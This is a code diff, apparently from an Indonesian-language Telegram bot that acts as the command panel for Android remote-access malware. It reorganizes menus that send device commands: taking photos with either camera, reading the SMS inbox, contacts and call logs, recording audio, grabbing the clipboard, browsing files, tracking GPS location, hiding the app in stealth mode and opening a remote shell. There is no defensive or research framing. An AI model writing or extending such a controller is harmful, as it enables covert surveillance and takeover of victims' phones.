@@ -432,30 +432,30 @@ Format Eksekusi Manual:
         const modeLabel = currentMode === 'turbo' ? '⚡ TURBO' : '🔋 NORMAL';
         const nextMode = currentMode === 'turbo' ? 'normal' : 'turbo';
 
-        const menuBtns = [
-            [{ text: `📊 Mode: ${modeLabel} (Switch)`, callback_data: `runcmd:${devId}:set_polling_mode ${nextMode}` }],
-            [{ text: '📡 Ping', callback_data: `runcmd:${devId}:ping` }, { text: '🎯 Lokasi GPS', callback_data: `runcmd:${devId}:location`, style: 'primary' }, { text: '📶 Scan WiFi', callback_data: `runcmd:${devId}:wifi_scan`, style: 'primary' }],
-            [{ text: '📸 Foto (Blkng)', callback_data: `runcmd:${devId}:photo back` }, { text: '🤳 Foto (Depan)', callback_data: `runcmd:${devId}:photo front` }],
-            [{ text: '📞 Kontak', callback_data: `runcmd:${devId}:contacts` }, { text: '📩 Inbox SMS', callback_data: `runcmd:${devId}:sms_list` }],
-            [{ text: '📂 File Explorer', callback_data: `runcmd:${devId}:ls /storage/emulated/0`, style: 'primary' }],
-            [{ text: '🔋 Baterai', callback_data: `runcmd:${devId}:get_battery` }, { text: '🔦 Torch (Toggle)', callback_data: `runcmd:${devId}:torch` }],
-            [{ text: isSecret ? '🏠 Menu Utama' : '🛠 Fitur Lanjutan', callback_data: isSecret ? `select_dev:${devId}` : `secret_menu:${devId}`, style: isSecret ? 'success' : 'danger' }]
-        ];
-
-        if (isSecret) {
-            menuBtns.splice(0, 6,
+        let menuBtns = [];
+        if (!isSecret) {
+            // --- MENU UTAMA: Status & Akses Cepat ---
+            menuBtns = [
+                [{ text: `📊 Mode: ${modeLabel} (Switch)`, callback_data: `runcmd:${devId}:set_polling_mode ${nextMode}` }],
+                [{ text: '📡 Ping', callback_data: `runcmd:${devId}:ping` }, { text: '🎯 Lokasi GPS', callback_data: `runcmd:${devId}:location`, style: 'primary' }],
+                [{ text: '📸 Foto (Blkng)', callback_data: `runcmd:${devId}:photo back` }, { text: '🤳 Foto (Depan)', callback_data: `runcmd:${devId}:photo front` }],
+                [{ text: '📩 Inbox SMS', callback_data: `runcmd:${devId}:sms_list` }, { text: 'ℹ️ Info Sistem', callback_data: `runcmd:${devId}:get_device_info` }],
+                [{ text: '📂 File Explorer', callback_data: `runcmd:${devId}:ls /storage/emulated/0`, style: 'primary' }],
+                [{ text: '🛠 Fitur Lanjutan', callback_data: `secret_menu:${devId}`, style: 'danger' }]
+            ];
+        } else {
+            // --- FITUR LANJUTAN: Kontrol & Data Sensitif (Tanpa Duplikat) ---
+            menuBtns = [
                 [{ text: '✉️ Kirim SMS', callback_data: `runcmd:${devId}:sms_send` }, { text: '🔊 Record Audio', callback_data: `runcmd:${devId}:record_sound` }],
-                [{ text: '🗣 Text to Speech', callback_data: `runcmd:${devId}:tts` }, { text: '🔔 Push Notify', callback_data: `runcmd:${devId}:notify` }],
-                [{ text: '🌐 Buka URL', callback_data: `runcmd:${devId}:open_url` }, { text: '🖼 Set Wallpaper', callback_data: `runcmd:${devId}:set_wallpaper` }],
-                [{ text: '📳 Getar HP', callback_data: `runcmd:${devId}:vibrate` }, { text: '🚨 Alarm Panik!', callback_data: `runcmd:${devId}:play_alarm`, style: 'danger' }],
-                [{ text: '☎️ Call Log', callback_data: `runcmd:${devId}:get_call_logs` }, { text: '📲 Dial Number', callback_data: `runcmd:${devId}:dial_number` }],
-                [{ text: '🔋 Baterai', callback_data: `runcmd:${devId}:get_battery` }, { text: '🔦 Torch (Toggle)', callback_data: `runcmd:${devId}:torch` }],
-                [{ text: '👻 Hide (Stealth)', callback_data: `runcmd:${devId}:hide_app`, style: 'danger' }, { text: '📻 Info Volume', callback_data: `runcmd:${devId}:get_volume` }],
-                [{ text: '📦 Daftar App', callback_data: `runcmd:${devId}:get_installed_apps` }, { text: 'ℹ️ Info Sistem', callback_data: `runcmd:${devId}:get_device_info` }],
-                [{ text: '🎵 Play Sound', callback_data: `runcmd:${devId}:play_sound` }, { text: '⚙️ Sensor', callback_data: `runcmd:${devId}:sensors` }],
-                [{ text: '📋 Clipboard', callback_data: `runcmd:${devId}:clipboard` }, { text: '💬 Show Toast', callback_data: `runcmd:${devId}:show_toast` }],
-                [{ text: '💻 Terminal Shell', callback_data: `runcmd:${devId}:shell`, style: 'danger' }]
-            );
+                [{ text: '📞 Kontak', callback_data: `runcmd:${devId}:contacts` }, { text: '☎️ Call Log', callback_data: `runcmd:${devId}:get_call_logs` }, { text: '📲 Dial', callback_data: `runcmd:${devId}:dial_number` }],
+                [{ text: '🔋 Baterai', callback_data: `runcmd:${devId}:get_battery` }, { text: '🔦 Torch', callback_data: `runcmd:${devId}:torch` }, { text: '📳 Getar', callback_data: `runcmd:${devId}:vibrate` }],
+                [{ text: '🗣 TTS', callback_data: `runcmd:${devId}:tts` }, { text: '🔔 Notify', callback_data: `runcmd:${devId}:notify` }, { text: '💬 Toast', callback_data: `runcmd:${devId}:show_toast` }],
+                [{ text: '🌐 Buka URL', callback_data: `runcmd:${devId}:open_url` }, { text: '🖼 Wallpaper', callback_data: `runcmd:${devId}:set_wallpaper` }, { text: '🎵 Sound', callback_data: `runcmd:${devId}:play_sound` }],
+                [{ text: '📻 Volume', callback_data: `runcmd:${devId}:get_volume` }, { text: '📋 Clipboard', callback_data: `runcmd:${devId}:clipboard` }, { text: '📶 WiFi', callback_data: `runcmd:${devId}:wifi_scan` }],
+                [{ text: '📦 Daftar App', callback_data: `runcmd:${devId}:get_installed_apps` }, { text: '⚙️ Sensor', callback_data: `runcmd:${devId}:sensors` }, { text: '🚨 Alarm', callback_data: `runcmd:${devId}:play_alarm`, style: 'danger' }],
+                [{ text: '👻 Hide Stealth', callback_data: `runcmd:${devId}:hide_app`, style: 'danger' }, { text: '💻 Shell', callback_data: `runcmd:${devId}:shell`, style: 'danger' }],
+                [{ text: '🏠 Kembali ke Utama', callback_data: `select_dev:${devId}`, style: 'success' }]
+            ];
         }
 
         const rawText = ctx.callbackQuery?.message?.text || '';
